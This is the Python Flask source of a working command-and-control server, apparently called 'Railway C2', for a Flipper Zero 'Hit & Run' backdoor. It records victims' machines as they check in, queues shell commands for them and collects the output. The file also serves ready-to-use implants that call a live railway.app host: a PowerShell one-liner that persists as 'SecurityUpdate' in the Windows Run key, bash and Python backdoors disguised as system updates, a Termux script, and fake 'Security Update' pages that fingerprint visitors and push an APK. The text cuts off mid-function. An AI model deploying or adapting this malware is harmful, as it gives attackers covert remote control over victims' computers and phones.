import os
import sqlite3
import json
import datetime
from threading import Lock
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'railway-c2-secret-2024')

# Thread-safe database
db_lock = Lock()
DATABASE_FILE = 'railway_c2.db'

# API Key für Sicherheit
API_KEY = os.environ.get('API_KEY', 'hitrun2024')

def init_database():
    """Initialize SQLite database optimized for Railway"""
    with sqlite3.connect(DATABASE_FILE) as conn:
        # Sessions table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hostname TEXT UNIQUE NOT NULL,
                username TEXT NOT NULL,
                ip_address TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                os_info TEXT,
                admin_status BOOLEAN DEFAULT FALSE,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Commands table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_hostname TEXT NOT NULL,
                command TEXT NOT NULL,
                executed BOOLEAN DEFAULT FALSE,
                result TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                FOREIGN KEY (session_hostname) REFERENCES sessions (hostname)
            )
        ''')
        
        # Results table for better performance
        conn.execute('''
            CREATE TABLE IF NOT EXISTS command_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_hostname TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                execution_time REAL,
                success BOOLEAN DEFAULT TRUE,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Create indexes for better performance
        conn.execute('CREATE INDEX IF NOT EXISTS idx_sessions_hostname ON sessions(hostname)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_commands_session ON commands(session_hostname)')
        conn.execute('CREATE INDEX IF NOT EXISTS idx_commands_executed ON commands(executed)')

# =============================================================================
# CORE BACKDOOR API - Ultra optimized for Railway
# =============================================================================

@app.route('/b', methods=['POST'])
def beacon():
    """Main beacon endpoint - targets check in here"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid request'}), 400
        
        hostname = data.get('h', 'unknown')
        username = data.get('u', 'unknown')
        admin_status = data.get('a', False)
        os_info = data.get('os', 'Unknown')
        
        # Get real IP (Railway handles X-Forwarded-For)
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        current_time = datetime.datetime.now()
        
        # Update or create session
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('''
                    INSERT OR REPLACE INTO sessions 
                    (hostname, username, ip_address, last_seen, os_info, admin_status, status)
                    VALUES (?, ?, ?, ?, ?, ?, 'active')
                ''', (hostname, username, ip_address, current_time, os_info, admin_status))
        
        # Get pending commands
        pending_commands = get_pending_commands(hostname)
        
        # Log beacon (optional - disable in production for stealth)
        print(f"[BEACON] {hostname} ({username}) from {ip_address} - Admin: {admin_status}")
        
        return jsonify({
            'c': pending_commands,
            'status': 'ok',
            'server_time': current_time.isoformat()
        })
        
    except Exception as e:
        print(f"Beacon error: {e}")
        return jsonify({'error': 'Server error'}), 500

@app.route('/r', methods=['POST'])
def result():
    """Command result endpoint"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid request'}), 400
        
        hostname = data.get('h', 'unknown')
        command = data.get('c', '')
        output = data.get('o', '')
        execution_time = data.get('t', 0)
        success = data.get('s', True)
        
        current_time = datetime.datetime.now()
        
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Store detailed result
                conn.execute('''
                    INSERT INTO command_results 
                    (session_hostname, command, output, execution_time, success, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (hostname, command, output[:5000], execution_time, success, current_time))  # Limit output size
                
                # Mark command as executed
                conn.execute('''
                    UPDATE commands 
                    SET executed = TRUE, result = ?, executed_at = ?
                    WHERE session_hostname = ? AND command = ? AND executed = FALSE
                ''', (output[:1000], current_time, hostname, command))
        
        print(f"[RESULT] {hostname}: {command[:30]}... ({len(output)} chars)")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"Result error: {e}")
        return jsonify({'error': 'Server error'}), 500

@app.route('/test')
def health_check():
    """Health check endpoint for Railway"""
    return jsonify({
        'status': 'online',
        'server': 'Railway C2',
        'version': '3.0',
        'timestamp': datetime.datetime.now().isoformat()
    })

def get_pending_commands(hostname):
    """Get pending commands for a session"""
    with db_lock:
        with sqlite3.connect(DATABASE_FILE) as conn:
            cursor = conn.execute('''
                SELECT command FROM commands 
                WHERE session_hostname = ? AND executed = FALSE
                ORDER BY created_at ASC LIMIT 10
            ''', (hostname,))
            return [row[0] for row in cursor.fetchall()]

# =============================================================================
# WEB DASHBOARD
# =============================================================================

@app.route('/')
def dashboard():
    """Main dashboard page"""
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return render_template('dashboard.html', timestamp=timestamp)

# =============================================================================
# API ENDPOINTS FOR DASHBOARD
# =============================================================================

@app.route('/api/sessions')
def api_sessions():
    """Get all sessions with detailed information"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                cursor = conn.execute('''
                    SELECT hostname, username, ip_address, os_info, admin_status, 
                           first_seen, last_seen, status
                    FROM sessions 
                    ORDER BY last_seen DESC
                ''')
                
                sessions = []
                for row in cursor.fetchall():
                    sessions.append({
                        'hostname': row[0],
                        'username': row[1],
                        'ip_address': row[2],
                        'os_info': row[3],
                        'admin_status': bool(row[4]),
                        'first_seen': row[5],
                        'last_seen': row[6],
                        'status': row[7]
                    })
        
        return jsonify({'sessions': sessions})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def api_stats():
    """Get dashboard statistics"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Active sessions (last 5 minutes)
                active_cursor = conn.execute('''
                    SELECT COUNT(*) FROM sessions 
                    WHERE datetime(last_seen) > datetime('now', '-5 minutes')
                ''')
                active_sessions = active_cursor.fetchone()[0]
                
                # Total sessions
                total_cursor = conn.execute('SELECT COUNT(*) FROM sessions')
                total_sessions = total_cursor.fetchone()[0]
                
                # Admin sessions
                admin_cursor = conn.execute('''
                    SELECT COUNT(*) FROM sessions 
                    WHERE admin_status = 1 AND datetime(last_seen) > datetime('now', '-5 minutes')
                ''')
                admin_sessions = admin_cursor.fetchone()[0]
                
                # Total commands
                cmd_cursor = conn.execute('SELECT COUNT(*) FROM commands')
                total_commands = cmd_cursor.fetchone()[0]
        
        return jsonify({
            'active_sessions': active_sessions,
            'total_sessions': total_sessions,
            'admin_sessions': admin_sessions,
            'total_commands': total_commands
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/execute', methods=['POST'])
def api_execute():
    """Queue command for execution"""
    try:
        data = request.get_json()
        
        # Simple API key check
        if data.get('api_key') != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        
        session = data.get('session', '').strip()
        command = data.get('command', '').strip()
        
        if not session or not command:
            return jsonify({'error': 'Session and command required'}), 400
        
        # Add command to queue
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('''
                    INSERT INTO commands (session_hostname, command, executed)
                    VALUES (?, ?, FALSE)
                ''', (session, command))
        
        print(f"[COMMAND] Queued for {session}: {command}")
        
        return jsonify({'message': f'Command queued for execution on {session}'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/result/<session>/<path:command>')
def api_get_result(session, command):
    """Get result of executed command"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                cursor = conn.execute('''
                    SELECT output, execution_time, success, timestamp 
                    FROM command_results
                    WHERE session_hostname = ? AND command = ?
                    ORDER BY timestamp DESC LIMIT 1
                ''', (session, command))
                
                result = cursor.fetchone()
                if result:
                    return jsonify({
                        'result': result[0],
                        'execution_time': result[1],
                        'success': result[2],
                        'timestamp': result[3]
                    })
                else:
                    return jsonify({'result': None})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =============================================================================
# Session Management
# =============================================================================

@app.route('/api/toggle-status', methods=['POST'])
def toggle_status():
    """Toggle session status between active/inactive"""
    try:
        data = request.get_json()
        if data.get('api_key') != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401

        hostname = data.get('hostname', '').strip()
        if not hostname:
            return jsonify({'error': 'Hostname required'}), 400

        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Get current status
                cursor = conn.execute('SELECT status FROM sessions WHERE hostname = ?', (hostname,))
                row = cursor.fetchone()
                if not row:
                    return jsonify({'error': 'Session not found'}), 404

                current_status = row[0]
                new_status = 'inactive' if current_status == 'active' else 'active'

                # Update status
                conn.execute('UPDATE sessions SET status = ? WHERE hostname = ?', (new_status, hostname))

        return jsonify({'message': f'Status for {hostname} changed to {new_status}'}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/delete-session', methods=['POST'])
def delete_session():
    """Delete a session and all associated data"""
    try:
        data = request.get_json()
        if data.get('api_key') != API_KEY:
            return jsonify({'error': 'Unauthorized'}), 401

        hostname = data.get('hostname', '').strip()
        if not hostname:
            return jsonify({'error': 'Hostname required'}), 400

        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                conn.execute('DELETE FROM sessions WHERE hostname = ?', (hostname,))
                conn.execute('DELETE FROM commands WHERE session_hostname = ?', (hostname,))
                conn.execute('DELETE FROM command_results WHERE session_hostname = ?', (hostname,))

        return jsonify({'message': f'Session {hostname} deleted successfully'}), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500

# =============================================================================
# DEPLOYMENT HELPER
# =============================================================================

@app.route('/deploy')
def deploy_instructions():
    """Show deployment instructions for Flipper Zero"""
    base_url = request.url_root.rstrip('/')
    
    instructions = f'''
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Railway C2 Deployment Instructions</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
        .container {{ max-width: 1000px; margin: 0 auto; }}
        .code {{ background: #1a1a1a; border: 1px solid #00ff41; padding: 15px; margin: 10px 0; }}
        .highlight {{ color: #ffaa00; font-weight: bold; }}
        h1, h2 {{ color: #00ff41; text-shadow: 0 0 5px #00ff41; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Railway C2 Server Deployment Complete!</h1>
        
        <h2>📡 Server Information</h2>
        <div class="code">
            <strong>Server URL:</strong> <span class="highlight">{base_url}</span><br>
            <strong>API Endpoint:</strong> {base_url}/b<br>
            <strong>Dashboard:</strong> <a href="{base_url}" style="color: #00ff41;">{base_url}</a><br>
            <strong>Status:</strong> <span style="color: #00ff41;">ONLINE</span>
        </div>
        
        <h2>🔧 Flipper Zero Configuration</h2>
        <p>Update your Flipper Zero code with this server URL:</p>
        <div class="code">
            <strong>File:</strong> hit_run_backdoor_i.h<br><br>
            <span style="color: #888;">// Change this line:</span><br>
            #define INTERNET_C2_SERVER "<span class="highlight">{base_url}</span>"
        </div>
        
        <h2>💉 Manual PowerShell Payload</h2>
        <p>For manual deployment or testing:</p>
        <div class="code" style="font-size: 12px; word-break: break-all;">
$s='{base_url}';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$p="$env:APPDATA\\SecurityUpdate.ps1";$c='while(1){{try{{$d=@{{h=$h;u=$u;a=([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator");os=(Get-WmiObject -Class Win32_OperatingSystem).Caption}};$r=irm $s/b -m post -b($d|ConvertTo-Json) -ContentType "application/json";$r.c|%{{if($_){{$o=iex $_ 2>&1|out-string;irm $s/r -m post -b(@{{h=$h;c=$_;o=$o;t=0;s=$true}}|ConvertTo-Json) -ContentType "application/json"}}}}}}catch{{sleep 30}}}}';$c|out-file $p;reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /d "powershell -w hidden -f $p" /f;$c|iex
        </div>
        
        <h2>✅ Testing</h2>
        <div class="code">
            <strong>Health Check:</strong> <a href="{base_url}/test" style="color: #00ff41;">{base_url}/test</a><br>
            <strong>Dashboard:</strong> <a href="{base_url}" style="color: #00ff41;">{base_url}</a><br>
            <strong>Expected Response:</strong> {{"status": "online", "server": "Railway C2"}}
        </div>
        
        <h2>🔒 Security Notes</h2>
        <ul>
            <li>✅ HTTPS automatically enabled by Railway</li>
            <li>✅ API key protection: hitrun2024</li>
            <li>✅ Real IP detection via X-Forwarded-For</li>
            <li>✅ SQLite database with session persistence</li>
            <li>⚠️ Change API_KEY environment variable for production</li>
        </ul>
        
        <h2>🚀 Next Steps</h2>
        <ol>
            <li>Update Flipper Zero code with the server URL above</li>
            <li>Compile and install updated Flipper app</li>
            <li>Deploy Hit & Run payload on target</li>
            <li>Monitor targets via web dashboard</li>
            <li>Execute commands remotely from anywhere</li>
        </ol>
        
        <p style="text-align: center; margin-top: 40px;">
            <a href="{base_url}" style="color: #00ff41; text-decoration: none; font-size: 18px;">
                🎯 Open C2 Dashboard →
            </a>
        </p>
    </div>
</body>
</html>
    '''
    
    return instructions

# =============================================================================
# ADMIN ENDPOINTS
# =============================================================================

@app.route('/admin/cleanup', methods=['POST'])
def admin_cleanup():
    """Clean old data"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                # Remove old sessions (7 days)
                conn.execute('''
                    DELETE FROM sessions 
                    WHERE datetime(last_seen) < datetime('now', '-7 days')
                ''')
                
                # Remove old commands (24 hours)
                conn.execute('''
                    DELETE FROM commands 
                    WHERE executed = TRUE AND datetime(created_at) < datetime('now', '-1 day')
                ''')
                
                # Remove old results (3 days)
                conn.execute('''
                    DELETE FROM command_results 
                    WHERE datetime(timestamp) < datetime('now', '-3 days')
                ''')
        
        return jsonify({'message': 'Cleanup completed successfully'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/admin/stats')
def admin_stats():
    """Detailed admin statistics"""
    try:
        with db_lock:
            with sqlite3.connect(DATABASE_FILE) as conn:
                stats = {}
                
                # Database size
                cursor = conn.execute("SELECT page_count * page_size as size FROM pragma_page_count(), pragma_page_size()")
                stats['db_size_bytes'] = cursor.fetchone()[0]
                
                # Table counts
                stats['sessions_count'] = conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
                stats['commands_count'] = conn.execute("SELECT COUNT(*) FROM commands").fetchone()[0]
                stats['results_count'] = conn.execute("SELECT COUNT(*) FROM command_results").fetchone()[0]
                
                # Recent activity
                stats['commands_last_hour'] = conn.execute('''
                    SELECT COUNT(*) FROM commands 
                    WHERE datetime(created_at) > datetime('now', '-1 hour')
                ''').fetchone()[0]
        
        return jsonify(stats)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500
# =============================================================================
# ZUSÄTZLICHE ENDPUNKTE FÜR BADUSB PAYLOADS
# Konfiguriert für: https://hitrunc2server-production.up.railway.app
# =============================================================================
# =============================================================================
# =============================================================================
# CROSS-PLATFORM SERVER ENDPUNKTE
# Für macOS, Linux, Android, iOS und Universal Web
# =============================================================================

import platform
import subprocess
import base64
from flask import request, jsonify, Response
from user_agents import parse

# =============================================================================
# macOS & LINUX ENDPOINTS
# =============================================================================

@app.route('/unix')
def unix_payload():
    """Unix/Linux/macOS Bash Payload"""
    user_agent = request.headers.get('User-Agent', '')
    
    # Detect OS
    is_macos = 'Mac' in user_agent or 'Darwin' in user_agent
    is_linux = 'Linux' in user_agent and 'Android' not in user_agent
    
    script = f'''#!/bin/bash
# Railway C2 Unix Payload
SERVER="https://hitrunc2server-production.up.railway.app"

# System Information
HOSTNAME=$(hostname)
USERNAME=$(whoami)
OS_INFO=$(uname -a)
IS_ROOT=false

if [ "$EUID" -eq 0 ]; then
    IS_ROOT=true
fi

# macOS specific info
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS_INFO="$OS_INFO $(sw_vers -productName) $(sw_vers -productVersion)"
fi

# Send initial beacon
curl -s -X POST "$SERVER/b" \\
    -H "Content-Type: application/json" \\
    -d "{{
        \\"h\\": \\"$HOSTNAME\\",
        \\"u\\": \\"$USERNAME\\", 
        \\"a\\": $IS_ROOT,
        \\"os\\": \\"$OS_INFO\\"
    }}" || true

# Command loop
while true; do
    sleep 30
    
    # Get commands
    COMMANDS=$(curl -s -X POST "$SERVER/b" \\
        -H "Content-Type: application/json" \\
        -d "{{
            \\"h\\": \\"$HOSTNAME\\",
            \\"u\\": \\"$USERNAME\\",
            \\"a\\": $IS_ROOT,
            \\"os\\": \\"$OS_INFO\\"
        }}" | python3 -c "import sys,json; data=json.load(sys.stdin); [print(cmd) for cmd in data.get('c',[])]" 2>/dev/null)
    
    # Execute commands
    if [ ! -z "$COMMANDS" ]; then
        while IFS= read -r cmd; do
            if [ ! -z "$cmd" ]; then
                OUTPUT=$(eval "$cmd" 2>&1)
                
                # Send result
                curl -s -X POST "$SERVER/r" \\
                    -H "Content-Type: application/json" \\
                    -d "{{
                        \\"h\\": \\"$HOSTNAME\\",
                        \\"c\\": \\"$cmd\\",
                        \\"o\\": \\"$OUTPUT\\",
                        \\"t\\": 0,
                        \\"s\\": true
                    }}" || true
            fi
        done <<< "$COMMANDS"
    fi
done &

# Persistence
{"# macOS LaunchAgent" if is_macos else "# Linux Systemd Service"}
PERSIST_DIR="{'$HOME/Library/LaunchAgents' if is_macos else '$HOME/.config/systemd/user'}"
mkdir -p "$PERSIST_DIR" 2>/dev/null

{"# macOS plist" if is_macos else "# Linux service"}
cat > "$PERSIST_DIR/{'com.apple.systemupdate.plist' if is_macos else 'system-update.service'}" << 'EOF'
{"<?xml version='1.0' encoding='UTF-8'?>" if is_macos else "[Unit]"}
{"<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>" if is_macos else "Description=System Update Service"}
{"<plist version='1.0'>" if is_macos else "After=network.target"}
{"<dict>" if is_macos else ""}
{"    <key>Label</key>" if is_macos else "[Service]"}
{"    <string>com.apple.systemupdate</string>" if is_macos else "Type=simple"}
{"    <key>ProgramArguments</key>" if is_macos else f"ExecStart=/bin/bash -c 'curl -fsSL {request.url_root.rstrip('/')}/unix | bash'"}
{"    <array>" if is_macos else "Restart=always"}
{"        <string>/bin/bash</string>" if is_macos else "User=%i"}
{"        <string>-c</string>" if is_macos else ""}
{"        <string>curl -fsSL https://hitrunc2server-production.up.railway.app/unix | bash</string>" if is_macos else "[Install]"}
{"    </array>" if is_macos else "WantedBy=default.target"}
{"    <key>RunAtLoad</key>" if is_macos else ""}
{"    <true/>" if is_macos else ""}
{"</dict>" if is_macos else ""}
{"</plist>" if is_macos else ""}
EOF

{"launchctl load $PERSIST_DIR/com.apple.systemupdate.plist 2>/dev/null || true" if is_macos else "systemctl --user enable system-update.service 2>/dev/null || true"}
{"systemctl --user start system-update.service 2>/dev/null || true" if not is_macos else ""}

echo "System update installed successfully"
'''
    
    return Response(script, mimetype='text/plain')

@app.route('/python')  
def python_payload():
    """Python-based Cross-Platform Payload"""
    payload = '''
import os
import sys
import json
import time
import platform
import subprocess
import urllib.request
import urllib.parse

SERVER = "https://hitrunc2server-production.up.railway.app"

def get_system_info():
    hostname = platform.node()
    username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
    os_info = f"{platform.system()} {platform.release()}"
    is_admin = os.getuid() == 0 if hasattr(os, 'getuid') else False
    
    return hostname, username, os_info, is_admin

def send_beacon(hostname, username, os_info, is_admin):
    try:
        data = {
            'h': hostname,
            'u': username, 
            'a': is_admin,
            'os': os_info
        }
        
        req = urllib.request.Request(
            f"{SERVER}/b",
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode())
    except:
        return {'c': []}

def send_result(hostname, command, output):
    try:
        data = {
            'h': hostname,
            'c': command,
            'o': output,
            't': 0,
            's': True
        }
        
        req = urllib.request.Request(
            f"{SERVER}/r",
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'}
        )
        
        urllib.request.urlopen(req)
    except:
        pass

def main():
    hostname, username, os_info, is_admin = get_system_info()
    
    while True:
        try:
            response = send_beacon(hostname, username, os_info, is_admin)
            commands = response.get('c', [])
            
            for cmd in commands:
                if cmd:
                    try:
                        output = subprocess.check_output(
                            cmd, shell=True, stderr=subprocess.STDOUT, 
                            universal_newlines=True, timeout=30
                        )
                    except subprocess.TimeoutExpired:
                        output = "Command timed out"
                    except Exception as e:
                        output = f"Error: {str(e)}"
                    
                    send_result(hostname, cmd, output)
            
            time.sleep(30)
        except KeyboardInterrupt:
            break
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
'''
    
    return Response(payload, mimetype='text/plain')

# =============================================================================
# ANDROID ENDPOINTS
# =============================================================================

@app.route('/android')
def android_page():
    """Android Web Interface"""
    html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📱 Android Security Update</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; margin: 0; padding: 20px; background: #1a1a1a; color: white; }
        .container { max-width: 400px; margin: 0 auto; text-align: center; }
        .logo { font-size: 48px; margin-bottom: 20px; }
        h1 { color: #4CAF50; margin-bottom: 10px; }
        .info { background: #333; padding: 20px; border-radius: 12px; margin: 20px 0; }
        .download-btn { 
            background: #4CAF50; color: white; padding: 15px 30px; 
            border: none; border-radius: 8px; font-size: 16px; cursor: pointer; 
            text-decoration: none; display: inline-block; margin: 10px;
        }
        .download-btn:hover { background: #45a049; }
        .warning { color: #ff9800; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🤖</div>
        <h1>Android Security Update</h1>
        <p>Critical security update available for your device</p>
        
        <div class="info">
            <h3>🔐 Security Patch Level</h3>
            <p>Current: <span id="currentPatch">Loading...</span></p>
            <p>Available: <span style="color: #4CAF50;">Latest</span></p>
        </div>
        
        <a href="/download/android-security-update.apk" class="download-btn">
            📥 Download Security Update
        </a>
        
        <a href="/termux" class="download-btn">
            🔧 Advanced Installation
        </a>
        
        <div class="warning">
            ⚠️ Install from unknown sources must be enabled
        </div>
    </div>
    
    <script>
        // Android-specific fingerprinting
        function collectAndroidInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                deviceMemory: navigator.deviceMemory || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                battery: 'getBattery' in navigator ? 'supported' : 'not supported',
                vibration: 'vibrate' in navigator ? 'supported' : 'not supported'
            };
            
            // Send Android device info
            fetch('/device-fingerprint', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'android_visit',
                    info: info,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Update patch level (fake)
            document.getElementById('currentPatch').textContent = '2023-11-01';
        }
        
        // Collect info on page load
        collectAndroidInfo();
        
        // Try to trigger download notification
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js').catch(() => {});
        }
    </script>
</body>
</html>
    '''
    return html

@app.route('/termux')
def termux_payload():
    """Termux-specific payload for Android"""
    script = '''#!/data/data/com.termux/files/usr/bin/bash
# Termux Android Payload

echo "📱 Installing Android C2 client..."

# Install dependencies
pkg update -y
pkg install -y python curl jq

# System info
HOSTNAME=$(getprop ro.product.model | tr ' ' '_')
USERNAME="android"
OS_INFO="Android $(getprop ro.build.version.release)"
IS_ROOT=false

if [ "$UID" -eq 0 ]; then
    IS_ROOT=true
fi

# Check if device is rooted
if command -v su >/dev/null 2>&1; then
    IS_ROOT=true
fi

SERVER="https://hitrunc2server-production.up.railway.app"

# Send beacon
curl -s -X POST "$SERVER/b" \\
    -H "Content-Type: application/json" \\
    -d "{
        \\"h\\": \\"$HOSTNAME\\",
        \\"u\\": \\"$USERNAME\\",
        \\"a\\": $IS_ROOT,
        \\"os\\": \\"$OS_INFO\\"
    }"

echo "✅ Android C2 client installed"
echo "🔄 Starting background service..."

# Background command loop
(
while true; do
    sleep 45
    
    COMMANDS=$(curl -s -X POST "$SERVER/b" \\
        -H "Content-Type: application/json" \\
        -d "{
            \\"h\\": \\"$HOSTNAME\\",
            \\"u\\": \\"$USERNAME\\",
            \\"a\\": $IS_ROOT,
            \\"os\\": \\"$OS_INFO\\"
        }" | jq -r '.c[]?' 2>/dev/null)
    
    if [ ! -z "$COMMANDS" ]; then
        echo "$COMMANDS" | while IFS= read -r cmd; do
            if [ ! -z "$cmd" ]; then
                OUTPUT=$(eval "$cmd" 2>&1)
                
                curl -s -X POST "$SERVER/r" \\
                    -H "Content-Type: application/json" \\
                    -d "{
                        \\"h\\": \\"$HOSTNAME\\",
                        \\"c\\": \\"$cmd\\",
                        \\"o\\": \\"$OUTPUT\\",
                        \\"t\\": 0,
                        \\"s\\": true
                    }"
            fi
        done
    fi
done
) &

echo "🎉 Setup complete! Android device connected to C2."
'''
    
    return Response(script, mimetype='text/plain')

# =============================================================================
# UNIVERSAL WEB ENDPOINT
# =============================================================================

@app.route('/universal')
def universal_web():
    """Universal Web-based Cross-Platform C2"""
    html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌐 System Update</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif; 
            margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { 
            max-width: 500px; background: rgba(255,255,255,0.1); 
            backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .logo { font-size: 64px; margin-bottom: 20px; }
        h1 { margin-bottom: 10px; font-size: 28px; }
        .status { background: rgba(76,175,80,0.2); padding: 15px; border-radius: 10px; margin: 20px 0; }
        .progress { background: rgba(255,255,255,0.2); height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; }
        .progress-bar { background: #4CAF50; height: 100%; width: 0%; transition: width 2s ease; }
        .info { font-size: 14px; opacity: 0.8; margin-top: 20px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">⚡</div>
        <h1>System Update</h1>
        <p id="statusText">Checking system compatibility...</p>
        
        <div class="status">
            <div id="systemInfo">🖥️ Analyzing system...</div>
        </div>
        
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="info">
            <div id="detailsText">Please wait while we optimize your system...</div>
        </div>
    </div>
    
    <script>
        class UniversalC2 {
            constructor() {
                this.server = 'https://hitrunc2server-production.up.railway.app';
                this.sessionId = this.generateSessionId();
                this.init();
            }
            
            generateSessionId() {
                return 'web-' + Math.random().toString(36).substr(2, 9);
            }
            
            async init() {
                await this.collectSystemInfo();
                await this.sendInitialBeacon();
                this.startCommandLoop();
                this.setupPersistence();
                this.updateUI();
            }
            
            async collectSystemInfo() {
                this.systemInfo = {
                    hostname: this.sessionId,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    memory: navigator.deviceMemory || 'unknown',
                    cores: navigator.hardwareConcurrency || 'unknown',
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink
                    } : 'unknown',
                    battery: await this.getBatteryInfo(),
                    permissions: await this.checkPermissions(),
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    webgl: this.getWebGLInfo(),
                    canvas: this.getCanvasFingerprint()
                };
                
                // OS Detection
                const ua = navigator.userAgent;
                if (ua.includes('Windows')) this.os = 'Windows';
                else if (ua.includes('Mac')) this.os = 'macOS';
                else if (ua.includes('Linux') && !ua.includes('Android')) this.os = 'Linux';
                else if (ua.includes('Android')) this.os = 'Android';
                else if (ua.includes('iPhone') || ua.includes('iPad')) this.os = 'iOS';
                else this.os = 'Unknown';
            }
            
            async getBatteryInfo() {
                try {
                    if ('getBattery' in navigator) {
                        const battery = await navigator.getBattery();
                        return {
                            level: battery.level,
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    }
                } catch (e) {}
                return 'unavailable';
            }
            
            async checkPermissions() {
                const permissions = {};
                const permissionNames = ['camera', 'microphone', 'geolocation', 'notifications'];
                
                for (const name of permissionNames) {
                    try {
                        const result = await navigator.permissions.query({name});
                        permissions[name] = result.state;
                    } catch (e) {
                        permissions[name] = 'unavailable';
                    }
                }
                
                return permissions;
            }
            
            getWebGLInfo() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
